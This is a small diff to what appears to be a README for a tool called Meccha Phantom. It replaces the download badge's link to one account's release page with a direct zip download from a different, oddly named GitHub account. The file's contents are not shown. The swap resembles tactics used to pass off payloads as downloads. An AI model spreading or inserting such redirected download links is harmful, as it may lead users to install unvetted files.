@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Attobrufigure/Meccha-Phantom/releases/latest)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/sectionpoemchant/Meccha-Chameleon-Phantom/releases/download/MecchaPhantom/MecchaTitan.zip)
 
 
 
